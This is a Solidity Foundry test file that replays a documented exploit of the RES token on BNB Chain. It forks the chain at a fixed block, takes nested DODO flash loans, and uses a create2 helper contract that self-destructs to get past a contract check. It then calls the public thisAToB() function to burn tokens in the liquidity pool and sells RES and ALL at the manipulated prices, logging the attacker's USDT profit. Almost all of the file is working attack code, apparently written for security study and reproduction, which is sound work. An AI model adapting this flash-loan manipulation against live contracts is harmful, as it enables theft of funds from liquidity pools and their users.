pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

interface IRES is IERC20{
    function thisAToB() external;
}

// @Analysis
// https://twitter.com/BlockSecTeam/status/1578041521273962496
// @Contract address
// https://bscscan.com/address/0xeccd8b08ac3b587b7175d40fb9c60a20990f8d21#code

contract ReceiveToken{
    constructor(){
        IRES RES = IRES(0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21);
        IERC20 ALL = IERC20(0x04C0f31C0f59496cf195d2d7F1dA908152722DE7);
        RES.approve(msg.sender, type(uint).max);
        ALL.approve(msg.sender, type(uint).max);
        selfdestruct(payable(msg.sender));
    }
    
}

contract ContractTest is DSTest{
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IRES RES = IRES(0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21);
    IERC20 ALL = IERC20(0x04C0f31C0f59496cf195d2d7F1dA908152722DE7);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 RESPair = Uni_Pair_V2(0x05ba2c512788bd95cd6D61D3109c53a14b01c82A);
    Uni_Pair_V2 ALLPair = Uni_Pair_V2(0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb);
    address dodo = 0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE;
    address dodo2 = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;
    uint amount;
    uint amount2;
    address add;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 21948016);
    }

    function testExploit() public payable{

        emit log_named_decimal_uint(
            "[Start] Attacker USDT balance before exploit",
            USDT.balanceOf(address(this)),
            18
        );
        // use mint wbnb to mock flashLoan
        address(WBNB).call{value: 30000 ether}("");
        WBNBToUSDT();
        uint USDTBefore = USDT.balanceOf(address(this));
        emit log_named_decimal_uint(
            "[Start] exchange USDT balance before exploit",
            USDT.balanceOf(address(this)),
            18
        );
        amount = USDT.balanceOf(dodo);
        amount2 = USDT.balanceOf(dodo2);
        USDT.approve(address(Router), type(uint).max);
        RES.approve(address(Router), type(uint).max);
        ALL.approve(address(Router), type(uint).max);
        bytes memory bytecode = type(ReceiveToken).creationCode;
        address _add;
        assembly{
            _add := create2(0, add(bytecode, 32), mload(bytecode), 0)
        }
        add = _add;
        DVM(dodo2).flashLoan(0, amount2, address(this), new bytes(1));

        uint USDTAfter = USDT.balanceOf(address(this));

        emit log_named_decimal_uint(
            "[End] RESPair USDT balance after exploit",
            USDT.balanceOf(address(RESPair)),
            18
        );

        emit log_named_decimal_uint(
            "[End] ALLPair USDT balance after exploit",
            USDT.balanceOf(address(ALLPair)),
            18
        );

        emit log_named_decimal_uint(
            "[End] Attacker USDT balance after exploit",
            USDTAfter - USDTBefore,
            18
        );

    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) public{
        if(msg.sender == dodo2){
            DVM(dodo).flashLoan(0, amount, address(this), new bytes(1));
            USDT.balanceOf(address(this));
            USDT.transfer(dodo2, amount2);
        }
        else{
        // get RES
        uint amountBuy = USDT.balanceOf(address(this)) / 4;
        buyRES(amountBuy);
        buyRES(amountBuy);
        buyRES(amountBuy);
        buyRES(amountBuy);
        // Burn RES in LP 
        RES.thisAToB();
        // Sell RES , ALL
        sellRES();
        sellALL();
        USDT.balanceOf(address(this));
        USDT.transfer(address(dodo), amount);
        }
    }

    function WBNBToUSDT() internal{
        WBNB.approve(address(Router), type(uint).max);
        address [] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function buyRES(uint amountBuy) internal{
        address [] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(RES);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountBuy,
            0,
            path,
            // pass isContract(), the exploiter use EOA address in another contract, i guess he approve the contract in advance
            add,
            block.timestamp
        );
    }

    function sellRES() internal{
        (uint reserve0, uint reserve1, ) = RESPair.getReserves(); // USDT, RES
        RES.transferFrom(add, address(RESPair), RES.balanceOf(add));
        uint amountin = RES.balanceOf(address(RESPair)) - reserve1;
        uint amountout = amountin * 9975 * reserve0 / (reserve1 * 10000 + amountin * 9975);
        RESPair.swap(amountout, 0, address(this), "");
    }

    function sellALL() internal{
        (uint reserve0, uint reserve1, ) = ALLPair.getReserves(); // ALL, USDT
        ALL.transferFrom(add, address(ALLPair), ALL.balanceOf(add));
        uint amountin = ALL.balanceOf(address(ALLPair)) - reserve0;
        uint amountout = amountin * 9975 * reserve1 / (reserve0 * 10000 + amountin * 9975);
        ALLPair.swap(0, amountout, address(this), "");
        
    }

    receive() external payable{}

}